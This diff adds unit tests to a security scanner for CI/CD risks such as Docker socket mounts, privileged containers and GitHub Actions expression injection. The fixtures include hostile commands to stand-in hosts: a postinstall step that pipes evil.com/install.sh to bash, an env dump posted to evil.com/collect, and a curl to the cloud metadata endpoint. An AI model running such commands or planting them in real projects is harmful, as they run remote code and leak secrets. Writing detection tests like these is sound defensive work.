@@ -670,4 +670,137 @@ secrets/
     }
   });
 
+  // ============================================
+  // CI/CD Security Pattern Tests
+  // ============================================
+
+  test('should detect Docker socket mounting', async () => {
+    setup();
+    try {
+      writeTestFile('docker-compose.yml', `
+        services:
+          app:
+            volumes:
+              - /var/run/docker.sock:/var/run/docker.sock
+      `);
+      const results = await scan(tmpDir, { checkPermissions: false, yara: false });
+      
+      assert.ok(
+        results.findings.some(f => f.ruleId === 'cicd-docker-socket'),
+        'Should detect Docker socket mounting'
+      );
+    } finally {
+      cleanup();
+    }
+  });
+
+  test('should detect privileged container', async () => {
+    setup();
+    try {
+      writeTestFile('run.sh', 'docker run --privileged myimage');
+      const results = await scan(tmpDir, { checkPermissions: false, yara: false });
+      
+      assert.ok(
+        results.findings.some(f => f.ruleId === 'cicd-privileged-container'),
+        'Should detect privileged container'
+      );
+    } finally {
+      cleanup();
+    }
+  });
+
+  test('should detect cloud metadata endpoint access', async () => {
+    setup();
+    try {
+      writeTestFile('script.sh', 'curl http://169.254.169.254/latest/meta-data/');
+      const results = await scan(tmpDir, { checkPermissions: false, yara: false });
+      
+      assert.ok(
+        results.findings.some(f => f.ruleId === 'cicd-aws-metadata'),
+        'Should detect cloud metadata access'
+      );
+    } finally {
+      cleanup();
+    }
+  });
+
+  test('should detect GitHub Actions expression injection', async () => {
+    setup();
+    try {
+      fs.mkdirSync(path.join(tmpDir, '.github', 'workflows'), { recursive: true });
+      writeTestFile('.github/workflows/ci.yml', `
+        name: CI
+        on: issue_comment
+        jobs:
+          test:
+            runs-on: ubuntu-latest
+            steps:
+              - run: echo "\${{ github.event.comment.body }}"
+      `);
+      const results = await scan(tmpDir, { checkPermissions: false, yara: false });
+      
+      assert.ok(
+        results.findings.some(f => f.ruleId === 'cicd-gha-expression-injection'),
+        'Should detect GHA expression injection'
+      );
+    } finally {
+      cleanup();
+    }
+  });
+
+  test('should detect suspicious postinstall script', async () => {
+    setup();
+    try {
+      writeTestFile('package.json', JSON.stringify({
+        name: "malicious-pkg",
+        scripts: {
+          postinstall: "curl https://evil.com/install.sh | bash"
+        }
+      }));
+      const results = await scan(tmpDir, { checkPermissions: false, yara: false });
+      
+      assert.ok(
+        results.findings.some(f => f.ruleId === 'cicd-postinstall-suspicious'),
+        'Should detect suspicious postinstall'
+      );
+    } finally {
+      cleanup();
+    }
+  });
+
+  test('should detect CI environment detection', async () => {
+    setup();
+    try {
+      writeTestFile('script.js', `
+        if (process.env.GITHUB_ACTIONS) {
+          // Do something different in CI
+          exfiltrateSecrets();
+        }
+      `);
+      const results = await scan(tmpDir, { checkPermissions: false, yara: false });
+      
+      assert.ok(
+        results.findings.some(f => f.ruleId === 'cicd-env-detection'),
+        'Should detect CI environment detection'
+      );
+    } finally {
+      cleanup();
+    }
+  });
+
+  test('should detect env dump to external URL', async () => {
+    setup();
+    try {
+      writeTestFile('exfil.sh', 'env | curl -X POST -d @- https://evil.com/collect');
+      const results = await scan(tmpDir, { checkPermissions: false, yara: false });
+      
+      assert.ok(
+        results.findings.some(f => f.ruleId === 'cicd-env-dump'),
+        'Should detect env dump exfiltration'
+      );
+    } finally {
+      cleanup();
+    }
+  });
+
 });
